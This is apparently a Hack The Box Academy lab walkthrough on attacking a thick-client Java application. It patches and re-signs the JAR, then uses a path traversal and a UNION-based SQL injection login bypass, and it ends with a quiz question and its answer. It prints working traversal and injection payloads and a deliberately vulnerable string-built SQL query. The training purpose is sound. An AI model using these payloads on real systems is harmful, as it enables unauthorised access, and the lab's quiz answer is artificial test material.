# Exploiting Web Vulnerabilities in Thick-Client Applications

Thick client applications with a three-tier architecture have a security advantage over those with a two-tier architecture since it prevents the end-user from communicating directly with the database server. However, three-tier applications can be susceptible to web-specific attacks like SQL Injection and Path Traversal.

During penetration testing, it is common for someone to encounter a thick client application that connects to a server to communicate with the database. The following scenario demonstrates a case where the tester has found the following files while enumerating an FTP server that provides `anonymous` user access.

* fatty-client.jar
* note.txt
* note2.txt
* note3.txt

Reading the content of all the text files reveals that:

* A server has been reconfigured to run on port `1337` instead of `8000`.
* This might be a thick/thin client architecture where the client application still needs to be updated to use the new port.
* The client application relies on `Java 8`.
* The login credentials for login in the client application are `qtc / clarabibi`.

Let's run the `fatty-client.jar` file by double-clicking on it. Once the app is started, we can log in using the credentials `qtc / clarabibi`.

![err](https://academy.hackthebox.com/storage/modules/113/thick\_clients\_web/err.png)

This is not successful, and the message `Connection Error!` is displayed. This is probably because the port pointing to the servers needs to be updated from `8000` to `1337`. Let's capture and analyze the network traffic using Wireshark to confirm this. Once Wireshark is started, we click on `Login` once again.

![wireshark](https://academy.hackthebox.com/storage/modules/113/thick\_clients\_web/wireshark.png)

Below is showcased an example on how to approach DNS requests from applications in your favour. Verify the contents of the C:\Windows\System32\drivers\etc\hosts file where the IP 172.16.17.114 is pointed to fatty.htb and server.fatty.htb

The client attempts to connect to the `server.fatty.htb` subdomain. Let's start a command prompt as administrator and add the following entry to the `hosts` file.

Exploiting Web Vulnerabilities in Thick-Client Applications

```cmd-session
C:\> echo 10.10.10.174    server.fatty.htb >> C:\Windows\System32\drivers\etc\hosts
```

Inspecting the traffic again reveals that the client is attempting to connect to port `8000`.

![port](https://academy.hackthebox.com/storage/modules/113/thick\_clients\_web/port.png)

The `fatty-client.jar` is a Java Archive file, and its content can be extracted by right-clicking on it and selecting `Extract files`.

Exploiting Web Vulnerabilities in Thick-Client Applications

```powershell-session
C:\> ls fatty-client\

```

Let's run PowerShell as administrator, navigate to the extracted directory and use the `Select-String` command to search all the files for port `8000`.

Exploiting Web Vulnerabilities in Thick-Client Applications

```powershell-session
C:\> ls fatty-client\ -recurse | Select-String "8000" | Select Path, LineNumber | Format-List

Path       : C:\Users\cybervaca\Desktop\fatty-client\beans.xml
LineNumber : 13
```

There's a match in `beans.xml`. This is a `Spring` configuration file containing configuration metadata. Let's read its content.

Exploiting Web Vulnerabilities in Thick-Client Applications

```powershell-session
C:\> cat fatty-client\beans.xml

<SNIP>
<!-- Here we have an constructor based injection, where Spring injects required arguments inside the
         constructor function. -->
   <bean id="connectionContext" class = "htb.fatty.shared.connection.ConnectionContext">
      <constructor-arg index="0" value = "server.fatty.htb"/>
      <constructor-arg index="1" value = "8000"/>
   </bean>

<!-- The next to beans use setter injection. For this kind of injection one needs to define an default
constructor for the object (no arguments) and one needs to define setter methods for the properties. -->
   <bean id="trustedFatty" class = "htb.fatty.shared.connection.TrustedFatty">
      <property name = "keystorePath" value = "fatty.p12"/>
   </bean>

   <bean id="secretHolder" class = "htb.fatty.shared.connection.SecretHolder">
      <property name = "secret" value = "clarabibiclarabibiclarabibi"/>
   </bean>
<SNIP>
```

Let's edit the line `<constructor-arg index="1" value = "8000"/>` and set the port to `1337`. Reading the content carefully, we also notice that the value of the `secret` is `clarabibiclarabibiclarabibi`. Running the edited application will fail due to an `SHA-256` digest mismatch. The JAR is signed, validating every file's `SHA-256` hashes before running. These hashes are present in the file `META-INF/MANIFEST.MF`.

Exploiting Web Vulnerabilities in Thick-Client Applications

```powershell-session
C:\> cat fatty-client\META-INF\MANIFEST.MF

Manifest-Version: 1.0
Archiver-Version: Plexus Archiver
Built-By: root
Sealed: True
Created-By: Apache Maven 3.3.9
Build-Jdk: 1.8.0_232

 r.class
SHA-256-Digest: h+JmFJqj0MnFbvd+LoFffOtcKcpbf/FD9h2AMOntcgw=
<SNIP>
```

Let's remove the hashes from `META-INF/MANIFEST.MF` and delete the `1.RSA` and `1.SF` files from the `META-INF` directory. The modified `MANIFEST.MF` should end with a new line.

Code: txt

```txt
Manifest-Version: 1.0
Archiver-Version: Plexus Archiver

Main-Class: htb.fatty.client.run.Starter

```

We can update and run the `fatty-client.jar` file by issuing the following commands.

Exploiting Web Vulnerabilities in Thick-Client Applications

```powershell-session
C:\> cd .\fatty-client
C:\> jar -cmf .\META-INF\MANIFEST.MF ..\fatty-client-new.jar *
```

Then, we double-click on the `fatty-client-new.jar` file to start it and try logging in using the credentials `qtc / clarabibi`.

![login](https://academy.hackthebox.com/storage/modules/113/thick\_clients\_web/login.png)

This time we get the message `Login Successful!`.

***

### Foothold

Clicking on `Profile` -> `Whoami` reveals that the user `qtc` is assigned with the `user` role.

![profile1](https://academy.hackthebox.com/storage/modules/113/thick\_clients\_web/profile1.png)

Clicking on the `ServerStatus,` we notice that we can't click on any options.

![status](https://academy.hackthebox.com/storage/modules/113/thick\_clients\_web/status.png)

This implies that there might be another user with higher privileges that is allowed to use this feature. Clicking on the `FileBrowser` -> `Notes.txt` reveals the file `security.txt`. Clicking the `Open` option at the bottom of the window shows the following content.

![security](https://academy.hackthebox.com/storage/modules/113/thick\_clients\_web/security.png)

This note informs us that a few critical issues in the application still need to be fixed. Navigating to the `FileBrowser` -> `Mail` option reveals the `dave.txt` file containing interesting information. We can read its content by clicking the `Open` option at the bottom of the window.

![dave](https://academy.hackthebox.com/storage/modules/113/thick\_clients\_web/dave.png)

The message from dave says that all `admin` users are removed from the database. It also refers to a timeout implemented in the login procedure to mitigate time-based SQL injection attacks.

***

### Path Traversal

Since we can read files, let's attempt a path traversal attack by giving the following payload in the field and clicking the `Open` button.

Code: txt

```txt
../../../../../../etc/passwd
```

![passwd](https://academy.hackthebox.com/storage/modules/113/thick\_clients\_web/passwd.png)

The server filters out the `/` character from the input. Let's decompile the application using [JD-GUI](http://java-decompiler.github.io/), by dragging and dropping the `fatty-client-new.jar` onto the `jd-gui`.

![jdgui](https://academy.hackthebox.com/storage/modules/113/thick\_clients\_web/jdgui.png)

Save the source code by pressing the `Save All Sources` option in `jdgui`. Decompress the `fatty-client-new.jar.src.zip` by right-clicking and selecting `Extract files`. The file `fatty-client-new.jar.src/htb/fatty/client/methods/Invoker.java` handles the application features. Reading its content reveals the following code.

Code: java

```java
public String showFiles(String folder) throws MessageParseException, MessageBuildException, IOException {
    String methodName = (new Object() {
      
      }).getClass().getEnclosingMethod().getName();
    logger.logInfo("[+] Method '" + methodName + "' was called by user '" + this.user.getUsername() + "'.");
    if (AccessCheck.checkAccess(methodName, this.user))
      return "Error: Method '" + methodName + "' is not allowed for this user account"; 
    this.action = new ActionMessage(this.sessionID, "files");
    this.action.addArgument(folder);
    sendAndRecv();
    if (this.response.hasError())
      return "Error: Your action caused an error on the application server!"; 
    return this.response.getContentAsString();
  }
```

The `showFiles` function takes in one argument for the folder name and then sends the data to the server using the `sendAndRecv()` call. The file `fatty-client-new.jar.src/htb/fatty/client/gui/ClientGuiTest.java` sets the folder option. Let's read its content.

Code: java

```java
configs.addActionListener(new ActionListener() {
          public void actionPerformed(ActionEvent e) {
            String response = "";
            ClientGuiTest.this.currentFolder = "configs";
            try {
              response = ClientGuiTest.this.invoker.showFiles("configs");
            } catch (MessageBuildException|htb.fatty.shared.message.MessageParseException e1) {
              JOptionPane.showMessageDialog(controlPanel, "Failure during message building/parsing.", "Error", 0);
            } catch (IOException e2) {
              JOptionPane.showMessageDialog(controlPanel, "Unable to contact the server. If this problem remains, please close and reopen the client.", "Error", 0);
            } 
            textPane.setText(response);
          }
        });
```

We can replace the `configs` folder name with `..` as follows.

Code: java

```java
ClientGuiTest.this.currentFolder = "..";
  try {
    response = ClientGuiTest.this.invoker.showFiles("..");
```

Next, compile the `ClientGuiTest.Java` file.

Exploiting Web Vulnerabilities in Thick-Client Applications

```powershell-session
C:\> javac -cp fatty-client-new.jar fatty-client-new.jar.src\htb\fatty\client\gui\ClientGuiTest.java
```

This generates several class files. Let's create a new folder and extract the contents of `fatty-client.jar` into it.

Exploiting Web Vulnerabilities in Thick-Client Applications

```powershell-session
C:\> mkdir raw
C:\> cp fatty-client-new.jar raw\fatty-client-new-2.jar
```

Navigate to the `raw` directory and decompress `fatty-client-new-2.jar` by right-clicking and selecting `Extract Here`. Overwrite any existing `htb/fatty/client/gui/*.class` files with updated class files.

Exploiting Web Vulnerabilities in Thick-Client Applications

```powershell-session
C:\> mv -Force fatty-client-new.jar.src\htb\fatty\client\gui\*.class raw\htb\fatty\client\gui\
```

Finally, we build the new JAR file.

Exploiting Web Vulnerabilities in Thick-Client Applications

```powershell-session
C:\> cd raw
C:\> jar -cmf META-INF\MANIFEST.MF traverse.jar .
```

Let's log in to the application and navigate to `FileBrowser` -> `Config` option.

![traverse](https://academy.hackthebox.com/storage/modules/113/thick\_clients\_web/traverse.png)

This is successful. We can now see the content of the directory `configs/../`. The files `fatty-server.jar` and `start.sh` look interesting. Listing the content of the `start.sh` file reveals that `fatty-server.jar` is running inside an Alpine Docker container.

![start](https://academy.hackthebox.com/storage/modules/113/thick\_clients\_web/start.png)

We can modify the `open` function in `fatty-client-new.jar.src/htb/fatty/client/methods/Invoker.java` to download the file `fatty-server.jar` as follows.

Code: java

```java
import java.io.FileOutputStream;
<SNIP>
public String open(String foldername, String filename) throws MessageParseException, MessageBuildException, IOException {
    String methodName = (new Object() {}).getClass().getEnclosingMethod().getName();
    logger.logInfo("[+] Method '" + methodName + "' was called by user '" + this.user.getUsername() + "'.");
    if (AccessCheck.checkAccess(methodName, this.user)) {
        return "Error: Method '" + methodName + "' is not allowed for this user account";
    }
    this.action = new ActionMessage(this.sessionID, "open");
    this.action.addArgument(foldername);
    this.action.addArgument(filename);
    sendAndRecv();
    String desktopPath = System.getProperty("user.home") + "\\Desktop\\fatty-server.jar";
    FileOutputStream fos = new FileOutputStream(desktopPath);
    
    if (this.response.hasError()) {
        return "Error: Your action caused an error on the application server!";
    }
    
    byte[] content = this.response.getContent();
    fos.write(content);
    fos.close();
    
    return "Successfully saved the file to " + desktopPath;
}
<SNIP>
```

Rebuild the JAR file by following the same steps and log in again to the application. Then, navigate to `FileBrowser` -> `Config`, add the `fatty-server.jar` name in the input field, and click the `Open` button.

![download](https://academy.hackthebox.com/storage/modules/113/thick\_clients\_web/download.png)

The `fatty-server.jar` file is successfully downloaded onto our desktop, and we can start the examination.

### SQL Injection

Decompiling the `fatty-server.jar` using JD-GUI reveals the file `htb/fatty/server/database/FattyDbSession.class` that contains a `checkLogin()` function that handles the login functionality. This function retrieves user details based on the provided username. It then compares the retrieved password with the provided password.

Code: java

```java
public User checkLogin(User user) throws LoginException {
    <SNIP>
      rs = stmt.executeQuery("SELECT id,username,email,password,role FROM users WHERE username='" + user.getUsername() + "'");
      <SNIP>
        if (newUser.getPassword().equalsIgnoreCase(user.getPassword()))
          return newUser; 
        throw new LoginException("Wrong Password!");
      <SNIP>
           this.logger.logError("[-] Failure with SQL query: ==> SELECT id,username,email,password,role FROM users WHERE username='" + user.getUsername() + "' <==");
      this.logger.logError("[-] Exception was: '" + e.getMessage() + "'");
      return null;
```

Let's check how the client application sends credentials to the server. The login button creates the new object `ClientGuiTest.this.user` for the `User` class. It then calls the `setUsername()` and `setPassword()` functions with the respective username and password values. The values that are returned from these functions are then sent to the server.

![logincode](https://academy.hackthebox.com/storage/modules/113/thick\_clients\_web/logincode.png)

Let's check the `setUsername()` and `setPassword()` functions from `htb/fatty/shared/resources/user.java`.

Code: java

```java
public void setUsername(String username) {
    this.username = username;
  }
  
  public void setPassword(String password) {
    String hashString = this.username + password + "clarabibimakeseverythingsecure";
    MessageDigest digest = null;
    try {
      digest = MessageDigest.getInstance("SHA-256");
    } catch (NoSuchAlgorithmException e) {
      e.printStackTrace();
    } 
    byte[] hash = digest.digest(hashString.getBytes(StandardCharsets.UTF_8));
    this.password = DatatypeConverter.printHexBinary(hash);
  }
```

The username is accepted without modification, but the password is changed to the format below.

Code: java

```java
sha256(username+password+"clarabibimakeseverythingsecure")
```

We also notice that the username isn't sanitized and is directly used in the SQL query, making it vulnerable to SQL injection.

Code: java

```java
rs = stmt.executeQuery("SELECT id,username,email,password,role FROM users WHERE username='" + user.getUsername() + "'");
```

The `checkLogin` function in `htb/fatty/server/database/FattyDbSession.class` writes the SQL exception to a log file.

Code: java

```java
<SNIP>
    this.logger.logError("[-] Failure with SQL query: ==> SELECT id,username,email,password,role FROM users WHERE username='" + user.getUsername() + "' <==");
      this.logger.logError("[-] Exception was: '" + e.getMessage() + "'");
<SNIP>
```

Login into the application using the username `qtc'` to validate the SQL injection vulnerability reveals a syntax error. To see the error, we need to edit the code in the `fatty-client-new.jar.src/htb/fatty/client/gui/ClientGuiTest.java` file as follows.

Code: java

```java
ClientGuiTest.this.currentFolder = "../logs";
  try {
    response = ClientGuiTest.this.invoker.showFiles("../logs");
```

Listing the content of the `error-log.txt` file reveals the following message.

![error](https://academy.hackthebox.com/storage/modules/113/thick\_clients\_web/error.png)

This confirms that the username field is vulnerable to SQL Injection. However, login attempts using payloads such as `' or '1'='1` in both fields fail. Assuming that the username in the login form is `' or '1'='1`, the server will process the username as below.

Code: sql

```sql
SELECT id,username,email,password,role FROM users WHERE username='' or '1'='1'
```

The above query succeeds and returns the first record in the database. The server then creates a new user object with the obtained results.

Code: java

```java
<SNIP>
if (rs.next()) {
        int id = rs.getInt("id");
        String username = rs.getString("username");
        String email = rs.getString("email");
        String password = rs.getString("password");
        String role = rs.getString("role");
        newUser = new User(id, username, password, email, Role.getRoleByName(role), false);
<SNIP>
```

It then compares the newly created user password with the user-supplied password.

Code: java

```java
<SNIP>
if (newUser.getPassword().equalsIgnoreCase(user.getPassword()))
    return newUser;
throw new LoginException("Wrong Password!");
<SNIP>
```

Then, the following value is produced by `newUser.getPassword()` function.

Code: java

```java
sha256("qtc"+"clarabibi"+"clarabibimakeseverythingsecure") = 5a67ea356b858a2318017f948ba505fd867ae151d6623ec32be86e9c688bf046
```

The user-supplied password hash `user.getPassword()` is calculated as follows.

Code: java

```java
sha256("' or '1'='1" + "' or '1'='1" + "clarabibimakeseverythingsecure") = cc421e01342afabdd4857e7a1db61d43010951c7d5269e075a029f5d192ee1c8
```

Although the hash sent to the server by the client doesn't match the one in the database, and the password comparison fails, the SQL injection is still possible using `UNION` queries. Let's consider the following example.

Code: sql

```sql
MariaDB [userdb]> select * from users where username='john';
+----------+-------------+
| username | password    |
+----------+-------------+
| john     | password123 |
+----------+-------------+
```

It is possible to create fake entries using the `SELECT` operator. Let's input an invalid username to create a new user entry.

Code: sql

```sql
MariaDB [userdb]> select * from users where username='test' union select 'admin', 'welcome123';
+----------+-------------+
| username | password    |
+----------+-------------+
| admin    | welcome123  |
+----------+-------------+
```

Similarly, the injection in the `username` field can be leveraged to create a fake user entry.

Code: java

```java
test' UNION SELECT 1,'invaliduser','invalid@a.b','invalidpass','admin
```

This way, the password, and the assigned role can be controlled. The following snippet of code sends the plaintext password entered in the form. Let's modify the code in `htb/fatty/shared/resources/User.java` to submit the password as it is from the client application.

Code: java

```java
public User(int uid, String username, String password, String email, Role role) {
    this.uid = uid;
    this.username = username;
    this.password = password;
    this.email = email;
    this.role = role;
}
public void setPassword(String password) {
    this.password = password;
  }
```

We can now rebuild the JAR file and attempt to log in using the payload `abc' UNION SELECT 1,'abc','a@b.com','abc','admin` in the `username` field and the random text `abc` in the `password` field.

![bypass](https://academy.hackthebox.com/storage/modules/113/thick\_clients\_web/bypass.png)

The server will eventually process the following query.

Code: sql

```sql
select id,username,email,password,role from users where username='abc' UNION SELECT 1,'abc','a@b.com','abc','admin'
```

The first select query fails, while the second returns valid user results with the role `admin` and the password `abc`. The password sent to the server is also `abc`, which results in a successful password comparison, and the application allows us to log in as the user `admin`.

![admin](https://academy.hackthebox.com/storage/modules/113/thick\_clients\_web/admin.png)

**Questions**

What is the IP address of the eth0 interface under the ServerStatus -> Ipconfig tab in the fatty-client application?

172.28.0.3
